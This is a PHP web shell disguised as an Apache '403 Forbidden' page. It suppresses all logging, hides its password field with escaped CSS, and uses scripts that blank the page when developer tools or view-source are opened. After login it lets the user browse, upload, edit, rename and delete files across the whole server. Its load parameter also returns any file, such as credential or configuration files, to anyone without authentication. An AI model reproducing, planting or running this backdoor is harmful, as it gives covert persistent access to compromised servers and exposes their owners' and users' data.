<?php
declare(strict_types=1);
session_start();

error_reporting(0);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
ini_set('log_errors', 0);

if(!isset($_GET['q'])){
    header('HTTP/1.1 403 Forbidden');
    exit(<<<HTML
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>403 Forbidden</title>
    </head>
    <body>
        <h1>Forbidden</h1>
        <p>You don't have permission to access {$_SERVER['REQUEST_URI']} on this server.</p>
        <hr>
        <address>
            Apache/2.4.39 Server at {$_SERVER['SERVER_NAME']} Port {$_SERVER['SERVER_PORT']}
        </address>
    </body>
    </html>
    HTML
    );
}

// --- Secure session ---
$cookieParams = session_get_cookie_params();
session_set_cookie_params([
  'lifetime' => $cookieParams['lifetime'],
  'path' => $cookieParams['path'],
  'domain' => $cookieParams['domain'],
  'secure' => (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off'),
  'httponly' => true,
  'samesite' => 'Lax'
]);

if (!isset($_SESSION['initiated'])) {
  session_regenerate_id(true);
  $_SESSION['initiated'] = true;
}

// --- Config ---
define('BASE_DIR', realpath(__DIR__ . '/files') ?: __DIR__);
if (!is_dir(BASE_DIR)) mkdir(BASE_DIR, 0755, true);
$PASSWORD_HASH = "$2a$12$.mDzD2W8iBjdqZboVInusObNsWriXTge.ICcIFWJuiwQ1RUPRIAhK";

if (!isset($_SESSION['login_attempts'])) $_SESSION['login_attempts'] = 0;
define('MAX_ATTEMPTS', 5);
define('LOCKOUT', 300);

if(isset($_GET['load'])){
  $path = resolve_path($_GET['path'] ?? BASE_DIR);
    $target = resolve_path($path . '/' . $_GET['load']);
    if (is_file($target)) {
        header('Content-Type: text/plain; charset=utf-8');
        readfile($target);
    } else {
        header('HTTP/1.1 404 Not Found');
        echo "File not found.";
    }
    exit;
}

// --- Helpers ---
function e($v){return htmlspecialchars($v,ENT_QUOTES,'UTF-8');}
function csrf_token(){if(empty($_SESSION['csrf_token']))$_SESSION['csrf_token']=bin2hex(random_bytes(24));return $_SESSION['csrf_token'];}
function csrf_check($t){return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'],$t);}
function isLoggedIn(){return $_SESSION['logged_in']??false;}
function resolve_path($path){
  $real = realpath($path);
  if(!$real) $real = $path;
  return $real;
}
function sanitize_name($name){
  if(preg_match('/[\/\\\\]/',$name))return null;
  $name=trim($name);
  if($name==''||$name=='.'||$name=='..')return null;
  return $name;
}
function formatBytes($b){$u=['B','KB','MB','GB'];$i=0;while($b>1024&&$i<count($u)-1){$b/=1024;$i++;}return round($b,2).' '.$u[$i];}

// --- Login ---
$login_error=null;
if(isset($_POST['action']) && $_POST['action']==='login'){
  if(!csrf_check($_POST['csrf_token']??''))die('Invalid CSRF');
  if(!empty($_SESSION['locked_until']) && time()<$_SESSION['locked_until']){
    $login_error="Too many attempts. Try later.";
  }elseif(password_verify($_POST['password']??'',$PASSWORD_HASH)){
    $_SESSION['logged_in']=true;
    $_SESSION['login_attempts']=0;
    session_regenerate_id(true);
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
  }else{
    $_SESSION['login_attempts']++;
    if($_SESSION['login_attempts']>=MAX_ATTEMPTS)$_SESSION['locked_until']=time()+LOCKOUT;
    $login_error="Incorrect password!";
  }
}
if(isset($_GET['logout'])){session_destroy();header("Location: ".$_SERVER['PHP_SELF']);exit;}

// --- Determine current path ---
$path = resolve_path($_GET['path'] ?? BASE_DIR);

// --- Handle Actions ---
$msg='';
if(isLoggedIn() && $_SERVER['REQUEST_METHOD']==='POST' && csrf_check($_POST['csrf_token']??'')){
  // Upload
  if(!empty($_FILES['file']['name'])){
    $target=$path.'/'.basename($_FILES['file']['name']);
    $ext=strtolower(pathinfo($target,PATHINFO_EXTENSION));
    if(in_array($ext,['php','phtml','exe','sh']))$msg="<div class='alert alert-danger'>File type not allowed.</div>";
    elseif(move_uploaded_file($_FILES['file']['tmp_name'],$target))$msg="<div class='alert alert-success'>File uploaded.</div>";
    else $msg="<div class='alert alert-danger'>Upload failed.</div>";
  }
  // New folder
  if(!empty($_POST['folder_name'])){
    $n=sanitize_name($_POST['folder_name']);
    if($n && mkdir($path.'/'.$n,0755))$msg="<div class='alert alert-success'>Folder created.</div>";
    else $msg="<div class='alert alert-danger'>Failed to create folder.</div>";
  }
  // New file
  if(!empty($_POST['file_name'])){
    $n=sanitize_name($_POST['file_name']);
    if($n && file_put_contents($path.'/'.$n,'')!==false)$msg="<div class='alert alert-success'>File created.</div>";
    else $msg="<div class='alert alert-danger'>Failed to create file.</div>";
  }
  // Delete
  if(isset($_POST['delete'])){
    $target=resolve_path($path.'/'.$_POST['delete']);
    if(is_file($target))unlink($target);
    elseif(is_dir($target))@rmdir($target);
    $msg="<div class='alert alert-success'>Deleted.</div>";
  }
  // Rename
  if(isset($_POST['rename_from'],$_POST['rename_to'])){
    $from=resolve_path($path.'/'.$_POST['rename_from']);
    $to=resolve_path($path.'/'.$_POST['rename_to']);
    if($from && dirname($from)==dirname($to)){
      rename($from,dirname($from).'/'.basename($to));
      $msg="<div class='alert alert-success'>Renamed.</div>";
    }
  }
  // Edit
  if(isset($_POST['edit_file'],$_POST['content'])){
    $target=resolve_path($path.'/'.$_POST['edit_file']);
    if(is_file($target)) file_put_contents($target,$_POST['content']);
    $msg="<div class='alert alert-success'>Saved changes.</div>";
  }
}

?>
<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<title>403 Forbidden</title>
<?php if(isLoggedIn()): ?>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>body{background:#eef2f5;font-family:'Segoe UI',sans-serif;} .item{padding:10px;border:1px solid #ddd;border-radius:8px;margin:5px;background:#fff;} .item:hover{background:#f8f9fa;} pre{white-space:pre-wrap;}</style>
<?php endif; ?>
</head><body class="p-3">
<?php if(!isLoggedIn()): ?>
    <h1>Forbidden</h1>
    <p>You don't have permission to access <?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?> on this server.</p>
    <hr>
    <address>
        Apache/2.4.39 Server at <?php echo $_SERVER['SERVER_NAME']; ?> Port <?php echo $_SERVER['SERVER_PORT']; ?>
    </address>
    <?php if($login_error): ?><div class="alert alert-danger"><?=e($login_error)?></div><?php endif; ?>
<script>
(function hardenClient() {
  document.addEventListener('contextmenu', e => e.preventDefault(), {passive:false});
  document.addEventListener('selectstart', e => e.preventDefault(), {passive:false});
  document.addEventListener('copy', e => e.preventDefault(), {passive:false});
  document.addEventListener('cut', e => e.preventDefault(), {passive:false});
  document.addEventListener('dragstart', e => e.preventDefault(), {passive:false});
  window.addEventListener('keydown', function (e) {
    const key = e.key || e.keyCode;
    if ((e.ctrlKey && (key === 'u' || key === 'U' || key === 's' || key === 'S' || key === 'p' || key === 'P')) ||
        (e.ctrlKey && e.shiftKey && ['I','i','J','j','C','c'].includes(key)) ||
        key === 'F12' || key === 'Tab') {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
  }, true);

  function detectDevTools() {
    const start = performance.now();
    debugger;
    const delta = performance.now() - start;
    if (delta > 100) {
      try {
        document.documentElement.innerHTML = '';
        window.location.href = 'about:blank';
      } catch (err) { /* ignore */ }
    }
  }

  function checkDevtoolsBySize() {
    if (window.outerWidth - window.innerWidth > 160 ||
        window.outerHeight - window.innerHeight > 160) {
      try {
        document.documentElement.innerHTML = '';
        window.location.href = 'about:blank';
      } catch (err) { /* ignore */ }
    }
  }

  setInterval(checkDevtoolsBySize, 500);
  setInterval(detectDevTools, 1200);

  try {
    if (location.href.startsWith('view-source:')) {
      document.documentElement.innerHTML = '';
      window.location.href = 'about:blank';
    }
  } catch (err) {}
  function showBlockedOverlay() {
    const o = document.createElement('div');
    o.id = 'blocked-overlay';
    Object.assign(o.style, {
      position: 'fixed', inset: 0, background: '#fff', color: '#000',
      display: 'flex', alignItems: 'center', justifyContent: 'center',
      zIndex: 2147483647, fontSize: '18px'
    });
    o.textContent = '403 Forbidden.';
    document.documentElement.appendChild(o);
  }
})();
</script>
    <form method="post">
        <input type="hidden" name="action" value="login">
        <input type="hidden" name="csrf_token" value="<?=e(csrf_token())?>">
        <input type="password" name="password" id="password" style="m\000061rgin:calc(0px);
  background:\000066ff;
  border:calc(1px) solid #ffffffff;
  position:abso\00006cute;
  t\00006fp:0;ri\000067ht:0">
        <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($token); ?>">
    </form>

<?php exit; endif; ?>

<div class="container-fluid">
  <div class="d-flex justify-content-between mb-3">
    <h4><i class="fas fa-folder-open text-primary"></i> <?=e($path)?></h4>
    <a href="?logout=1" class="btn btn-danger"><i class="fas fa-sign-out-alt"></i> Logout</a>
  </div>
  <?=$msg?>
  <div class="mb-3"><a href="?path=<?=e(dirname($path))?>&q" class="btn btn-success"><i class="fas fa-arrow-up"></i> Up</a></div>

  <div class="row">
  <?php
  $items=array_diff(scandir($path),['.','..']);
  foreach($items as $it):
    $full=$path.'/'.$it;
    $icon=is_dir($full)?'fa-folder text-warning':'fa-file text-success';
  ?>
    <div class="col-md-3">
      <div class="item">
        <i class="fas <?=$icon?>"></i> 
        <?php if(is_dir($full)): ?>
          <a href="?path=<?=urlencode($full)?>&q"><?=e($it)?></a>
        <?php else: ?>
          <?=e($it)?>
        <?php endif; ?>
        <small class="d-block text-muted"><?=date("Y-m-d H:i",filemtime($full))?> | <?=is_file($full)?formatBytes(filesize($full)):'DIR'?></small>
        <form method="POST" class="mt-1 d-flex gap-1">
          <input type="hidden" name="csrf_token" value="<?=e(csrf_token())?>">
          <input type="hidden" name="delete" value="<?=e($it)?>">
          <button class="btn btn-sm btn-danger" onclick="return confirm('Delete <?=e($it)?>?')"><i class="fas fa-trash"></i></button>
          <button type="button" class="btn btn-sm btn-warning" onclick="renamePrompt('<?=e($it)?>')"><i class="fas fa-pen"></i></button>
          <?php if(is_file($full)): ?>
            <button type="button" class="btn btn-sm btn-info" onclick="editFile('<?=e($it)?>')"><i class="fas fa-edit"></i></button>
          <?php endif; ?>
        </form>
      </div>
    </div>
  <?php endforeach; ?>
  </div>

  <hr>
  <h5>Actions</h5>
  <form method="POST" enctype="multipart/form-data" class="mb-2">
    <input type="hidden" name="csrf_token" value="<?=e(csrf_token())?>">
    <input type="file" name="file" required>
    <button class="btn btn-primary btn-sm">Upload</button>
  </form>
  <form method="POST" class="mb-2">
    <input type="hidden" name="csrf_token" value="<?=e(csrf_token())?>">
    <input type="text" name="folder_name" placeholder="New folder name" required>
    <button class="btn btn-warning btn-sm">Create Folder</button>
  </form>
  <form method="POST" class="mb-3">
    <input type="hidden" name="csrf_token" value="<?=e(csrf_token())?>">
    <input type="text" name="file_name" placeholder="New file name" required>
    <button class="btn btn-success btn-sm">Create File</button>
  </form>
</div>

<!-- Rename Modal -->
<div id="renameModal" class="p-3 bg-light border rounded" style="display:none;position:fixed;top:20%;left:40%;z-index:10;">
  <h6>Rename Item</h6>
  <form method="POST">
    <input type="hidden" name="csrf_token" value="<?=e(csrf_token())?>">
    <input type="hidden" name="rename_from" id="rename_from">
    <input type="text" name="rename_to" id="rename_to" class="form-control mb-2">
    <button class="btn btn-warning btn-sm">Rename</button>
    <button type="button" class="btn btn-secondary btn-sm" onclick="document.getElementById('renameModal').style.display='none'">Cancel</button>
  </form>
</div>

<!-- Edit Modal -->
<div id="editModal" class="p-3 bg-light border rounded" style="display:none;position:fixed;top:10%;left:15%;right:15%;z-index:10;">
  <h6>Edit File</h6>
  <form method="POST">
    <input type="hidden" name="csrf_token" value="<?=e(csrf_token())?>">
    <input type="hidden" name="edit_file" id="edit_file">
    <textarea name="content" id="edit_content" class="form-control mb-2" style="height:400px;"></textarea>
    <button class="btn btn-success btn-sm">Save</button>
    <button type="button" class="btn btn-secondary btn-sm" onclick="document.getElementById('editModal').style.display='none'">Close</button>
  </form>
</div>

<script>
function renamePrompt(name){
  document.getElementById('rename_from').value=name;
  document.getElementById('rename_to').value=name;
  document.getElementById('renameModal').style.display='block';
}
function editFile(name){
  fetch('?q&path=<?=urlencode($path)?>&load='+encodeURIComponent(name))
    .then(r=>r.text()).then(t=>{
      document.getElementById('edit_file').value=name;
      document.getElementById('edit_content').value=t;
      document.getElementById('editModal').style.display='block';
    });
}
</script>
</body></html>
